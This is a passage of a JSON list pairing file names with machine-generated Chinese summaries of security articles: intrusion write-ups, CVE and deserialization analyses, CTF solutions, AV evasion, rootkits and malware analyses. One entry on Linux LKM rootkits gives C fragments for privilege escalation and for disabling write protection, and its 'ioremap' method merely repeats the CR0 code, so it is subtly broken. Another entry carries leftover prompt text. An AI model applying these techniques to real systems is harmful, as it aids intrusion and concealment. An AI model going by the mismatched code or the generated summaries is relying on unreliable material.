        "page_content": "该文档记录了一次针对教育机构统一身份认证系统的漏洞挖掘过程。通过收集信息，整合已知条件，利用语法搜索和爆破技术，作者成功突破了默认密码登录，并修改了密码。最终，作者获得了 VPN 权限，可以访问多个内网系统进行进一步测试。",
        "FileName": "11960-记一次EDU漏洞挖掘.pdf"
    },
    {
        "page_content": "**主题：** Tomcat 进程注入技术复现\n\n**内容：** 该文档详细介绍了如何利用 Java Instrumentation 技术对 Tomcat 进程进行注入，从而实现内存 WebShell 的功能。它提供了详细的步骤，包括 Java 环境搭建、Tomcat 安装和配置、memShell 工具的使用，以及如何通过 URL 参数触发注入代码。该技术可以绕过传统安全措施，在目标服务器上执行任意命令。",
        "FileName": "8383-Tomcat进程注入技术复现.pdf"
    },
    {
        "page_content": "文档主题：CVE-2015-4852 Weblogic 反序列化漏洞利⽤⼊⻔ ——CVE-2015-4852 Weblogic 反序列化漏洞利⽤⼊⻔\n文档内容：1.登录 Weblogic 反序列化漏洞利⽤⼊⻔ ——CVE-2015-4852 Weblogic 反序列化漏洞利⽤⼊⻔ sakai   /  2021-03-04 09:34:08  /  浏览数  9840 摘⾃ wikipedia WebLogic 是美商 Oracle 的主要产品之⼀，系购并得来。是商业市场上主要的 Java 应⽤服务器软件之⼀，是世界上第⼀个成功商业 化的 J2EE 应⽤服务器 CVE-2015-4852 CVE-2016-0638 CVE-2016-3510 CVE-2017-3248 CVE-2017-3506 CVE-2017-10271 CVE-2018-2628 CVE-2018-2893 CVE-2018-3191 CVE-2018-3197 CVE-2018-3201 CVE-2018-3245 CVE-2019-2890 但是据参考⽂章所⾔，主要其实可以分为两⼤块 : 1 、利⽤ xml decoded 反序列化进⾏远程代码执⾏的漏洞，例如： CVE-2017-10271 ， CVE-2017-3506 。 2 、利⽤ t3 协议 +java 反序列化进⾏远程代码执⾏的漏洞，例如： CVE-2015-4852 、 CVE-2016-0638 、 CVE-2016-3510 、 CVE-2017-3248 、 CVE-2018-2628 、 CVE-2018-2894 这篇⽂章主要是我复现 CVE-2015-4852 的过程记录，这个漏洞利⽤的是后者，也就是 t3 协议 +java 反序列 化 因为本⽂的主要内容是对漏洞的复现和原理分析，所以这部分并没有详细展开 RMI 是 Rmote Method Invocation 的简称， RMI ⽬前使⽤ JRMP 进⾏通信。 JRMP 指的是 java remote method protocol （ Java 远程消息交换协议），也就是说 JRMP 是专⻔为 RMI 实现的协议。 上⾯提到的 JRMP 协议是 rmi 默认使⽤的协议，但是 Weblogic Server 中的 RMI 通信使⽤ T3 协议和其他 java 程序间传输数据（序列化 的类）， t3 协议是⾼度优化的 rmi ，更详细的内容可以参考下⾯的 T3 协议部分",
        "FileName": "9216-Weblogic反序列化漏洞利用入门——CVE-2015-4852.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 MS-SAMR 协议修改或重置 Windows 域用户密码，包括使用 SetNTLM 和 ChangeNTLM 工具。这些工具允许攻击者在仅知道用户密码哈希的情况下修改密码，并在使用后恢复用户的原始密码。文档还提供了检测和缓解措施，例如设置密码策略和监控用户活动。",
        "FileName": "10062-利用MS-SAMR协议修改重置用户密码.pdf"
    },
    {
        "page_content": "该文档分析了 Cobalt Strike 4.5 stageless beacon 的 HTTP 通信过程，重点关注了如何实现各种功能以及通信包的结构，以便研究人员可以自行实现 beacon。文档通过反编译 JAR 包、提取序列化密钥和对通信数据进行 base64 编码来进行分析。",
        "FileName": "12546-cobaltstrike4.5 stageless beacon 通信分析.pdf"
    },
    {
        "page_content": "该文档详细介绍了渗透 MATRIX-BREAKOUT: 2 MORPHEUS 靶机的过程，包括信息收集、目录扫描、XSS 漏洞利用、webshell 管理、反弹 shell 上传、DirtyPipe 漏洞利用和最终提权，最终成功获取了两个 flag。",
        "FileName": "12583-MATRIX-BREAKOUT 2 MORPHEUS靶机渗透.pdf"
    },
    {
        "page_content": "该文档分析了移动开发中使用 CherryX 平台进行抓包时遇到的加密问题。通过对应用程序进行脱壳和跟踪函数，作者发现加密过程涉及 3DES 或 RSA 加密，具体取决于 encryptFlag 的值。作者还跟踪了密钥生成过程，发现每次登录都会更换密钥。文档强调了平台开发中使用 encryptFlag 值来判断加密类型，并建议以案例为参考进行 hook 以解决加密问题。",
        "FileName": "12685-cherry X移动开发系列抓包.pdf"
    },
    {
        "page_content": "该文档分析了 Apache Commons Text 库中的一个漏洞，该漏洞允许攻击者通过 StringSubstitutor 类执行任意 JavaScript 代码。漏洞的根源在于 ScriptStringLookup 类中对字符串的分割，导致可以绕过安全限制并执行恶意代码。该漏洞影响 Apache Commons Text 1.9.x 及更早版本，可以通过删除 stringLookupMap 中的 script 键来修复。",
        "FileName": "11761-Apache  Commons Text.pdf"
    },
    {
        "page_content": "本文档介绍了在 Kubernetes 云原生环境中进行渗透测试的实战经验。通过信息收集和暴力破解，渗透者获得了普通用户权限，并通过初始化渗透环境、挂载节点根目录、获取 Node 节点权限、下载安装 kubectl、设置容忍度和污点，最终成功获取了 Kubernetes 集群的权限。",
        "FileName": "11996-K8S云原生渗透实战.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2015-1641 漏洞，该漏洞是一个 Microsoft Word 中的类型混淆漏洞，允许攻击者通过精心构造的 RTF 文档实现任意内存写入和代码执行。文档详细介绍了漏洞的成因、影响版本、利用样本分析、攻击链以及缓解措施。",
        "FileName": "8559-CVE-2015-1641及利用样本分析.pdf"
    },
    {
        "page_content": "这篇文档详细介绍了如何解决 InCTF 的 GoSQLv3 挑战，该挑战基于 PostgreSQL 注射，并利用了 SSRF 来向数据库引擎发送 Gopher 请求。通过分析查询、绕过黑名单、构造查询语句、枚举可用的协议、利用 PostgreSQL Gopher 漏洞以及使用 SQL 注射技术，作者成功地检索了 secret 的位置并获取了 flag。",
        "FileName": "8145-解决InCTF的GoSQLv3.pdf"
    },
    {
        "page_content": "该文档介绍了一个轻量级的 SSH 蜜罐项目，它基于 Debian-Linux 的 OpenSSH，用于诱导攻击者进行网络攻击，并记录其行为和 IP 等信息。该项目包括全面的部署脚本、SSH 蜜罐集成启动器和网络监测仪，可以自动创建和设置隔离环境，并识别和记录网络攻击。",
        "FileName": "12884-SSH蜜罐  SSH_Honeypot.pdf"
    },
    {
        "page_content": "本文档探讨了使用 Transformer 模型进行动态病毒检测。作者将病毒的 API 调用序列视为单词，并使用 Transformer 模型来识别不同类型的病毒。该方法涉及将 API 调用转换为数字序列，然后将序列分成子序列并进行补齐。作者还提供了 Transformer 模型的详细解释，包括其参数和训练过程。",
        "FileName": "12597-利用 transformer 进行动态病毒检测.pdf"
    },
    {
        "page_content": "该文档分析了名为 APS 的新型信息窃取恶意软件，该软件已感染超过一万台设备。该恶意软件伪装成 CDR 绘图应用程序安装包，并使用复杂的技术来对抗安全软件，包括清空安全软件的 TCP 表项以防止其上传恶意样本。恶意软件收集主机信息并将其发送给攻击者的服务器，包括网络配置、进程列表、登录用户和无线网络配置。文档建议避免打开来历不明的文件，并定期使用杀毒软件进行全盘扫描。",
        "FileName": "11740-警惕破解软件！APS 窃密木马已感染万余台设备.pdf"
    },
    {
        "page_content": "**主题：** MySQL 8.0 中的 SQL 注入新特性\n\n**内容：** MySQL 8.0 引入了两个新关键字，`TABLE` 和 `VALUES`，它们可以用于列出表的详细信息和构造表。这些特性可以与 `UNION` 一起使用，用于 SQL 注入攻击，例如判断列数、回显位置、获取数据库和表信息，以及注入数据。",
        "FileName": "8646-MYSQL8.0注入新特性.pdf"
    },
    {
        "page_content": "该文档主要介绍了如何在 Spring MVC 中注册 Controller 和 Interceptor 内存马，并提供了详细的代码示例。它首先介绍了注册 Controller 的过程，包括获取上下文环境、注册映射和构造内存马。然后，它介绍了注册 Interceptor 的过程，包括获取上下文环境、反射获取 adaptedInterceptors 属性和构造内存马。最后，它提供了完整的代码示例，展示了如何使用这些技术在 Spring MVC 中注入内存马。",
        "FileName": "12538-浅析Spring类内存马.pdf"
    },
    {
        "page_content": "该文档分析了某漫画软件的协议，重点关注了App-Info参数和visitor_sign参数。通过全局搜索和跟踪跳转，确定了visitor_sign参数是通过base64加密和md5加密的。文档还提供了解密参数的方法，并指出该软件使用了常见的第三方开源模块，如数字联盟、tv.cjump.jni、uk.co.senab.photoview、Timeber.log、retrofit2+okhttp3、fastjson框架、qalsdk、master.flame.danmaku和com.meituan.robust。",
        "FileName": "12248-对某一漫画软件协议分析.pdf"
    },
    {
        "page_content": "OurPHP 任意文件上传漏洞（CNVD-2021-18284）存在于 OurPHP V3.0.0 版本中，由于后缀黑名单未过滤 .user.ini 文件，攻击者可通过上传 .user.ini 文件包含任意文件执行 PHP 代码，从而获取服务器控制权。",
        "FileName": "12219-PHP代码审计-Ourphp任意文件上传漏洞(CNVD-2021-18284).pdf"
    },
    {
        "page_content": "该文档分析了 zzcms2021 前台代码中一个可能的写配置文件漏洞。通过对 _authcode 函数的分析，发现可以通过构造 code 传参并添加 poc 来利用 xml_unserialize 函数的未过滤输入，在 updateapps 方法中通过正则匹配替换 config.inc.php 文件中的 UC_API 配置，从而实现写 shell。",
        "FileName": "10432-代码审计-zzcms2021前台写shell.pdf"
    },
    {
        "page_content": "该文档详细介绍了利用 PostgreSQL 盲注漏洞窃取 PSYCOPG2 数据的过程，包括识别漏洞、枚举表和列、使用类型转换获取信息以及检索用户数据。该漏洞允许攻击者访问敏感信息，例如用户电子邮件地址和密码哈希值，并修改或删除表。",
        "FileName": "8659-POSTGRESQL盲注窃取PSYCOPG2数据.pdf"
    },
    {
        "page_content": "该文档探讨了从开发中衍生的安全问题，包括 SQL 注入、CSRF、XSS 和文件上传漏洞。它强调了开发人员在编写安全代码中的作用，并提供了示例代码来说明这些漏洞是如何发生的以及如何防止它们。",
        "FileName": "11327-从一次简单的开发引申出的一些安全问题.pdf"
    },
    {
        "page_content": "本文档详细描述了作者从发现 CVE-2021-22204 到成功利用该漏洞的过程。作者通过审计 ExifTool 的源代码，发现了一个使用 eval 函数处理元数据的漏洞。通过修改元数据，作者能够触发 eval 函数执行任意代码，从而在目标系统上获得代码执行权限。该漏洞影响了使用 ExifTool 处理元数据的多种图像格式，包括 JPEG、TIFF 和 PNG。",
        "FileName": "9762-CVE-2021-22204 - ExifTool RCE详细分析.pdf"
    },
    {
        "page_content": "本文探讨了 Windows 下的反调试技术，包括通过修改内核标志、设置线程隐藏、遍历 TEB 和钩取调试事件等方法，深入分析了调试器与被调试程序建立连接的原理，并提供了多种反调试策略。",
        "FileName": "11192-windows下的反调试探究.pdf"
    },
    {
        "page_content": "本文探讨了 PHP 源代码保护方案，包括源代码混淆、OPCODE 混淆和修改解释引擎。它分析了各种加密方法，包括无扩展和有扩展方案，并提供了手动和自动解密技术。此外，本文还介绍了使用 PHP 扩展来混淆代码和自动化通用解密。",
        "FileName": "10729-浅谈PHP源代码保护方案&受保护PHP代码の解密还原.pdf"
    },
    {
        "page_content": "本文档分析了服务器上发现的挖矿木马，该木马伪装成 kswapd0 进程，利用 CPU 挖门罗币。文档详细介绍了木马的运行机制，包括其收集信息、杀死现有挖矿进程、修改系统设置和添加后门密钥等行为。文档还提供了检测和删除木马的步骤，包括删除相关文件、杀死进程、删除定时任务和修改密钥。",
        "FileName": "9558-挖矿木马分析之肉鸡竟是我自己.pdf"
    },
    {
        "page_content": "本文探讨了传递哈希值 (PTH) 的替代方法，包括使用 WinRM、远程桌面、smbclient、LDAP、Kerberos 票证、cifs 挂载、SSH 和基于资源的约束委派 (RBCD)。这些方法在不同情况下很有用，例如当 SMB 未启用、终端保护阻止标准工具集或需要管理访问权限时。",
        "FileName": "8665-传递哈希的另类用法(pth).pdf"
    },
    {
        "page_content": "该文档分析了 FastJson1.2.24 中基于 TemplatesImpl 链的构造原理以及 ysoserial 中针对 jdk7u21 基于 TemplatesImpl 加动态代理链的构造原理，详细介绍了漏洞利用过程中的技术点，包括 TemplatesImpl 的 getOutputProperties 函数、动态代理 AnnotationInvocationHandler 的构造和触发机制，以及 jdk7u25 中修复动态代理的原理。",
        "FileName": "7096-从0到1掌握某Json-TemplatesImpl链与ysoserial-jdk7u21的前因后果.pdf"
    },
    {
        "page_content": "该文档详细描述了作者在对一个政府网站进行渗透测试时发现的一系列漏洞，包括不当的错误处理、远程代码执行和访问控制漏洞。通过利用这些漏洞，作者能够提升权限，创建具有管理员权限的新用户，并访问该国家 7000 多个政府网站。",
        "FileName": "8264-bugbounty之政府网址一锅端.pdf"
    },
    {
        "page_content": "这篇文档详细介绍了如何复现 NUAACTF 2021 Easy_XSS 挑战，该挑战涉及 XSS 绕过、PHP 代码审计和文件上传绕过。通过利用 iframe 的 srcdoc 属性，即使在过滤替换为其他字符的情况下，也可以成功执行 XSS 攻击。",
        "FileName": "9516-NUAACTF2021 Easy_XSS 复现.pdf"
    },
    {
        "page_content": "该文档是一篇关于网络安全渗透测试的博客文章，作者分享了如何利用酒店自助售货机的支付漏洞进行渗透测试的详细步骤。文章还包含了其他读者的评论和问题，反映了该主题在网络安全社区中的受欢迎程度。",
        "FileName": "8375-1.pdf"
    },
    {
        "page_content": "该文档分析了 Java 安全 SnakeYaml 组件中类的探测到反序列化在 SPI/C3P0/FastJson 的利用，介绍了利用 URLClassLoader 探测、使用 Key 调用 hashCode 方法探测、外部探测漏洞点、探测内部类 trick 等技术，并提供了利用 !! 指定类、%TAG! tag.yaml.org,2002 提前声明等方法进行反序列化。",
        "FileName": "12012-Java安全SnakeYaml组件中类的探测到反序列化在SPIC3P0FastJson的利用.pdf"
    },
    {
        "page_content": "该文档详细介绍了如何从目标 Web 服务器获取 shell 访问权限，然后使用该访问权限在域环境中横向移动，最终获得域控制器的控制权。该文档涵盖了各种技术，包括利用 ThinkPHP 漏洞、提权、密码哈希转储、域渗透和权限维持。",
        "FileName": "10344-记一次从tp到域控.pdf"
    },
    {
        "page_content": "该文档重点介绍了攻击者在获取内网机器控制权后，如何进行横向移动和攻击域控服务器的技巧。它涵盖了域的概念、Windows 认证协议、凭证窃取、横向移动、Pass The Hash、导出域成员 Hash、黄金白银票据和 MS14-068 等技术。",
        "FileName": "8038-内网渗透技巧之横向控制.pdf"
    },
    {
        "page_content": "该文档分析了 Zend Framework 和 Laminas 框架中的反序列化漏洞，提供了利用这些漏洞进行反序列化攻击、远程代码执行和获取 shell 的方法。文档还提供了利用这些漏洞的示例代码和利用栈，并讨论了如何通过可变函数和可控参数来绕过安全措施。",
        "FileName": "8975-Zend FrameWork Pop Chain.pdf"
    },
    {
        "page_content": "ELK 是一套开源软件，包括 Elasticsearch、Logstash 和 Kibana，用于集中式日志管理和分析。Elasticsearch 是一个搜索和分析引擎，Logstash 是一个数据处理管道，Kibana 是一个数据可视化平台。ELK 可以收集、处理和可视化来自不同来源的大量日志数据，从而帮助用户快速分析和解决问题。",
        "FileName": "8971-初探ELK和集中式日志管理系统.pdf"
    },
    {
        "page_content": "CVE-2017-0785 漏洞存在于 Android BlueDroid 和 Fluoride 蓝牙协议栈中，原因是 SDP server 未正确处理 continuation state，攻击者可利用此漏洞泄露 Android 栈上的内存信息，绕过 ASLR。该漏洞涉及 SDP 协议中 continuation state 的处理，当攻击者发送带有恶意 continuation state 的 SDP 请求时，SDP server 会错误地计算剩余需要传输的 handle 数量，导致 underflow，从而使 continuation state 持续启用，最终导致内存越界读和泄露。",
        "FileName": "7551-BlueBorne 之 CVE-2017-0785 原理分析.pdf"
    },
    {
        "page_content": "**文档主题：** 现代 Linux rootkit 技术实现（1）\n\n**文档内容：**\n\n本系列文章将对 Linux 下基于 LKM 的 rootkit 实现技术进行汇总，主要基于 x86 架构，仅供实验与学习，请勿用于违法犯罪：\n\n( 注：本篇文章选自陕⻄某高校硕士毕业论文，论文题目为《基于 LKM 的 Linux rootkit 技术研究》，作者为墨晚鸢，指导教师为常新波，发表时间为 2023 年 4 月 18 日。 )\n\n**0x00. 一切开始之前**\n\n**基础的 LKM**\n\nLinux 下的 rootkit 主要以「可装载内核模块」的形式存在，作为内核的⼀部分直接以 ring0 权限向入 侵者提供服务。由于 rootkit 本身作为内核的⼀部分运⾏于内核态，其可以实现很多特殊的功能。\n\n本系列文章将给出⼀些比较经典的 rootkit 技术实现⽅案，包括：\n\n- 进程提权\n- 函数劫持\n- ⽂件隐藏\n- 模块隐藏\n- 进程隐藏\n\n**0x01. 进程提权**\n\n**方法一：直接修改当前进程的 cred**\n\n在 Linux 内核上可以直接通过修改进程的 cred 来完成提权，cred 在内核空间中的表示为 struct cred，其包含了进程的权限信息，包括 uid、gid、suid、sgid 等。\n\n**方法二：复制 init 进程的 cred**\n\n我们可以直接通过复制 init 进程的 cred 来完成提权，因为 init 进程是所有进程最终的⽗进程，其⽗进程为其⾃身，因此我们可以直接修改对应进 程的权限，现笔者给出如下例程进⾏测试：\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/ioctl.h>\n#define ROOT_PRIVILEGE 0x1919\nint main(int argc, char **argv, char **envp) {\n    int dev_fd = open(\"/dev/a3rootkit\", O_RDONLY);\n    if (argc < 2) {\n        return 0;\n    }\n    ioctl(dev_fd, ROOT_PRIVILEGE, atoi(argv[1]));\n}\n```\n\n**方法三：函数劫持完成对只读区域的改写**\n\n由于 direct mapping area 有着对所有物理内存的映射，但是也根据映射的区域权限进⾏了相应的权限设 置（例如映射只读段的⻚⾯为可读可执⾏权限），因此我们⽆法通过这块区域进⾏覆写，⽽需要重新建⽴新的映射。\n\n**0x02. 函数劫持**\n\n**方法一：利⽤ ioremap 完成物理内存直接改写**\n\n我们可以通过 ioremap() 函数完成物理内存直接改写（推荐），这⾥笔者给出⼀个通⽤的改写内存只读区域的代码：\n\n```c\nvoid a3_rootkit_write_read_only_mem_by_ioremap(void *dst, void *src, size_t len) {\n    size_t orig_cr0;\n    orig_cr0 = a3_rootkit_read_cr0();\n    a3_rootkit_disable_write_protect();\n    memcpy(dst, src, len);\n    a3_rootkit_enable_write_protect();\n    a3_rootkit_write_cr0(orig_cr0);\n}\n```\n\n**方法二：修改 cr0 寄存器直接写内联汇编即可，这⾥笔者给出⼀个通⽤的改写内存只读区域的代码：**\n\n```c\nvoid a3_rootkit_write_read_only_mem_by_cr0(void *dst, void *src, size_t len) {\n    size_t orig_cr0;\n    orig_cr0 = a3_rootkit_read_cr0();\n    a3_rootkit_disable_write_protect();\n    memcpy(dst, src, len);\n    a3_rootkit_enable_write_protect();\n    a3_rootkit_write_cr0(orig_cr0);\n}\n```\n\n**方法三：直接修改内核⻚表项**\n\n当进⾏系统调⽤时实际上会通过调⽤函数表中的函数指针完成的，因此我们可以很⽅便的通过劫持特定表中 的函数指针的⽅式来完成 hook。\n\n**0x03. ⽂件隐藏**\n\n**方法一：直接劫持 getdents 系统调⽤核⼼函数**\n\n当我们使⽤ ls 查看某个⽬录下的⽂件时，实际上会调⽤到 getdents64()/getdents()/compat_getdents() 这三个系统调⽤之⼀来获取某个⽬录下的⽂件信息，并以如下形式的结构体数组返回：\n\n```c\nstruct linux_dirent {\n    unsigned long d_ino;\n    unsigned long d_off;\n    unsigned short d_reclen;\n    char d_name[1];\n};\n```\n\n**方法二：劫持对应⽂件系统的 VFS 函数表**\n\n由于填充返回给⽤户的数据的核⼼逻辑便是调⽤ ctx->actor()，因此我们可以在我们⾃定义的 iterate_shared / iterate 中直接动态修改 ctx->actor 函数指针，从⽽完成⽂件隐藏：\n\n**0x04. 模块隐藏**\n\n**方法一：模块符号 & /proc/modules 隐藏**\n\n当我们的模块被装载进内核之后，其导出符号会变成内核公⽤符号表的⼀部分，可以直接通过 /proc/kallsyms 进⾏查看：\n\n同时我们可以通过 /proc/modules 查看已经装载的内核模块：\n\n因此我们需要对这两处地⽅进⾏隐藏，⽽这都需要基于同⼀个数据结构来完成：\n\n**方法二：/sys/module 隐藏**\n\n当我们读取 /sys/module ⽬录时内核会根据 module_kset 的层次结构动态⽣成各个模块的⽂件夹，因此我们需要将我们的模 块从 module_kset 的层次结构中脱离，从⽽完成 sysfs 下的隐藏，这⾥我们可以直接使⽤内核提供的 kobject_del() 函数完成 kobject 的摘除：\n\n**方法三：/proc/vmallocinfo 隐藏**\n\n⽽通过读取 /proc/vmallocinfo ⽂件我们可以获取所有通过 vmap 机制分配的内存信息，其中便包括我们的 rootkit 所占⽤的 内存：\n\n因此我们还需要深⼊完成内存映射结构的隐藏。\n\n**方法四：/sys/class 隐藏**\n\n如果你的 rootkit 使⽤ procfs 提供⽤户态接⼝，则可以直接跳过这⼀节：\n\n**方法五：/sys/device/virtual 隐藏**\n\n如果你的 rootkit 使⽤ procfs 提供⽤户态接⼝，则可以直接跳过这⼀节：\n\n**方法六：模块依赖关系隐藏**\n\n如果我们的 rootkit 依赖于其他的模块，则模块间依赖关系会被记录于 sys/module/ 依赖模块 /holder/ 中，因此我们也需要完成 对模块依赖关系的隐藏。\n\n**Extra. 进程隐藏**\n\n⼀个进程在不同的 pid 命名空间内可能有着不同的 pid（其中⼦命名空间对⽗命名空间完全可⻅），内核通过 upid 结构体存储 ⼀个 pid 结构体在相应命名空间中的值，根据命名空间的⽗⼦层次结构存储在 pid 结构体中动态分配的 upid 数组中：\n\n为了提⾼查找速度，pid 在内核中被组织成基数树（radix trie，对应 idr 结构体），当进⾏ pid 结构体查找时（find_vpid()）实际上会先获取到当前进程的 pid 命名空间（struct pid_namespace）再进⾏基数树搜索。\n```",
        "FileName": "12439-现代 Linux rootkit 技术实现（1）.pdf"
    },
    {
        "page_content": "本文探讨了使用 strace 工具在 Linux 系统上收集登录凭证的方法。strace 是一种调试工具，可通过附加到进程来跟踪正在运行的进程，并记录进程执行的系统调用及其参数。通过这种方式，我们可以跟踪任何进程的数据，例如 sshd、ssh、su 和 sudo，以获取登录凭证。本文还介绍了 strace 的语法、使用条件以及如何设置命令别名以自动收集登录凭证。",
        "FileName": "7698-linux后渗透之收集登录凭证.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用安洵杯 ezjaba 比赛中的反序列化链和 JDBC 攻击获得 first blood。它详细分析了应用程序的依赖项、结构和代码，并展示了如何绕过反序列化黑名单和 JDBC 连接串限制，最终利用 MySQL 任意文件读取漏洞获取远程主机的文件。",
        "FileName": "11896-2022安洵杯ezjaba 从寻找反序列化链到成功JDBC attack拿到first blood.pdf"
    },
    {
        "page_content": "该文档介绍了利用 ICMP 协议建立网络隧道的技术，包括 icmpsh、PingTunnel、icmptunnel 等工具的使用方法和优缺点。这些工具可以绕过防火墙限制，实现不受限制的网络访问，但仅适用于特定操作系统或环境。",
        "FileName": "9434-网络层ICMP隧道研究.pdf"
    },
    {
        "page_content": "该文档分析了 Eclipse Jetty WEB-INF 敏感信息泄露漏洞（CVE-2021-28164/CVE-2021-34429），重点关注了如何通过编码和相对路径绕过对敏感信息的校验，并探讨了 Jetty 中 URL 路径解析方式存在的问题。",
        "FileName": "10039-Eclipse Jetty WEB-INF敏感信息泄露漏洞分析（CVE-2021-28164CVE-2021-34429）.pdf"
    },
    {
        "page_content": "该文档介绍了如何使用 Python 创建一个自签名的 HTTPS 服务器，以加密文件传输并防止恶意 IP 标记。它提供了详细的代码示例，说明如何生成自签名证书、创建 HTTPS 服务器并忽略证书检查以下载文件。",
        "FileName": "12605-用python简单起个https服务器.pdf"
    },
    {
        "page_content": "该文档介绍了一种利用阿里云 ECS 接口执行命令反弹 shell 的方法。通过访问 Laravel 站点的 .env 文件，攻击者获取了阿里云的 accessKeyId 和 accessSecret，然后使用 ECS API 创建一个命令，该命令包含反弹 shell 的命令。通过调用 InvokeCommand 接口，攻击者可以在目标实例上执行该命令，从而反弹一个 shell。",
        "FileName": "8310-从报错信息泄露到使用ECS接口执行命令反弹shell.pdf"
    },
    {
        "page_content": "该文档分析了 ManageEngine ADSelfService Plus 中的 CVE-2021-40539 漏洞，该漏洞允许攻击者绕过身份验证并上传恶意文件，从而在目标系统上执行任意命令。",
        "FileName": "10529-ManageEngine ADSelfService Plus（CVE-2021-40539）漏洞分析.pdf"
    },
    {
        "page_content": "本文档分析了佳能打印机 DryOS 操作系统代码，并展示了如何利用漏洞在打印机上执行代码。该漏洞存在于负责检查密码的处理程序的解码函数中，攻击者可以通过溢出缓冲区并破坏相邻内存中的下一个字段来利用它。通过发送一个大的 CADM 回显数据包，攻击者可以获取伪造块，并将受控数据与 CADM 数据结构重叠，从而执行 shellcode 并显示图像。",
        "FileName": "12529-佳能打印机DryOS操作系统代码分析与ShellCode利用.pdf"
    },
    {
        "page_content": "本文分析了 Cobalt Strike DLL Stager 的执行流程，重点关注其使用命名管道来传输加密的 shellcode。通过修改执行流程，作者证明了命名管道实际上是检测基础，并且可以通过修补执行流程来降低检测率。该分析突出了 Cobalt Strike DLL 的常见特征，并强调了在选择定制交付机制时遵循设计选择的必要性。",
        "FileName": "9512-剖析Cobalt Strike的DLL Stager.pdf"
    },
    {
        "page_content": "**文档主题：** 分析如下文档并完成以下任务：\n                    \n**文档内容：**\n                    1. 分析文档的主题和内容\n                    2. 用一段话概括文档\n                    ## 任务：\n                    1. 分析文档的主题和内容\n                    2. 用一段话概括文档\n\n**主题：** Kentico CMS SOAP Deserialize RCE CVE-2019-10068\n\n**内容：**\n该文档描述了 Kentico CMS 中的 SOAP 反序列化漏洞，该漏洞允许未经身份验证的远程代码执行。该漏洞是由于在反序列化用户控制的 .NET 对象输入时未能验证安全标头。该反序列化导致未经身份验证的远程代码执行，攻击者可以在托管 Kentico 实例的服务器上执行任意命令。\n\n**概括：**\n该文档分析了 Kentico CMS 中的 SOAP 反序列化漏洞 (CVE-2019-10068)，该漏洞允许未经身份验证的远程代码执行，并提供了利用该漏洞的步骤。",
        "FileName": "9595-.net反序列化之SoapFormatter.pdf"
    },
    {
        "page_content": "该文档探讨了 Tomcat URL 解析差异性带来的安全问题，重点关注 getRequestURI() 和 getRequestURL() 函数在处理特殊字符（如 ;、./、../）时的不同行为。通过分析 Tomcat 对这些特殊字符的处理过程，文档揭示了攻击者如何利用这些差异性绕过访问限制，并提供了几个成功的绕过认证限制的有效负载。",
        "FileName": "7544-Tomcat URL解析差异性导致的安全问题.pdf"
    },
    {
        "page_content": "该文档主要介绍了 house of emma 漏洞利用的详细过程，包括 libc 和 heap 地址的泄露、fake_IO_FILE 和 orw 的模板、stderr 和 pointer_guard 的攻击、topchunk 大小的修改、IO 调用的触发以及最终的 flag 获取。",
        "FileName": "12366-house of emma 心得体会.pdf"
    },
    {
        "page_content": "这篇文档主要介绍了在 Rust 语言中实现 shellcode 加载和混淆的多种方法，包括基本加载方式、异或加密、RC4 加密、AES-CFB 加密以及添加随机字符等混淆技术。这些方法可以有效地绕过杀毒软件的检测，提高 shellcode 的免杀能力。",
        "FileName": "12618-Rust免杀 - Shellcode加载与混淆.pdf"
    },
    {
        "page_content": "该文档详细描述了作者通过分析源代码泄露、利用隐藏的 HTML 页面和绕过 WAF，成功渗透两个网站并上传任意文件的过程。作者使用了时间戳爆破技术，根据网站的命名规律和时间戳格式，猜测上传文件的路径和文件名，最终获得了网站权限。",
        "FileName": "10280-一次运气很好的文件上传.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2021-22005 漏洞，该漏洞影响 VMware vCenter Server，允许攻击者通过任意文件上传获取服务器权限。文档详细介绍了漏洞的利用方法，包括如何绕过 CEIP 保护、创建 prod 目录、遍历目录并写入任意文件。最后，文档还提供了补丁分析，解释了补丁如何修复漏洞。",
        "FileName": "10524-CVE-2021-22005-CEIP分析.pdf"
    },
    {
        "page_content": "Windows 反恶意软件扫描接口 (AMSI) 是一种通用接口标准，允许应用程序和服务与机器上存在的任何反恶意软件产品集成，为用户及其数据、应用程序和工作负载提供增强的恶意软件保护。AMSI 与反恶意软件供应商无关，它旨在支持当今可以集成到应用程序中的最常见的恶意软件扫描和保护技术。",
        "FileName": "9991-初探 Windows AMSI （反恶意软件扫描接口）.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2021-39115 漏洞，这是一个影响 Atlassian Jira Service Management Server 的服务端模板渲染漏洞。该漏洞允许具有 Jira Administrator 权限的攻击者通过修改 header.vm 文件并注入 SPEL 表达式来执行任意命令。该文档提供了漏洞复现步骤，并解释了漏洞利用 Email Templates 功能点和 Velocity 模板引擎。",
        "FileName": "10281-CVE-2021-39115-Atlassian Jira Service Management Server SSTI漏洞分析.pdf"
    },
    {
        "page_content": "该文档分析了某微 1day 后台 RCE 漏洞，该漏洞存在于后台的 getInterfaceRegisterCustomOperation 接口中，攻击者可以通过构造特定的请求参数，利用 JavaCodeToObject 函数执行任意 Java 代码，从而达到远程命令执行的目的。",
        "FileName": "11947-某微1day后台RCE审计.pdf"
    },
    {
        "page_content": "该文档探讨了在站库分离数据库不出网且没有 Webshell 的情况下，通过数据库落地可执行文件 (exe) 的方法。它介绍了使用 Bcp、sp_makewebtask、Echo 和 Python 等工具将 exe 的 16 进制写入表，然后导出为 exe 文件。此外，文档还讨论了使用日志备份和差异备份来导出 exe 的可能性，并提供了相关参考链接。",
        "FileName": "10976-关于站库分离数据库不出网落地Exe方式探究-Mssql.pdf"
    },
    {
        "page_content": "本文探讨了在 CTF 中绕过 Flask SSti 的各种技巧，包括利用字符串拼接、格式化字符串、进制字符串、对象属性和过滤器。通过分析 Python 字符串的特性和 Jinja2 模板引擎的解析过程，文章提供了绕过常见过滤器的具体示例，例如使用 `lipsum` 函数、`request` 对象和 `attr` 过滤器。此外，文章还介绍了如何利用 `~` 运算符进行字符串拼接，以及如何使用 `dict` 和 `string` 过滤器绕过引号过滤。",
        "FileName": "9008-ctf中flask_ssti的各种绕过技巧.pdf"
    },
    {
        "page_content": "该文档分析了 Django CVE-2021-35042 SQL 注入漏洞，该漏洞是由 Django 的 order_by 查询方法在处理带表名查询时未对列名进行充分过滤造成的，导致攻击者可以通过构造闭合语句进行 SQL 注入。",
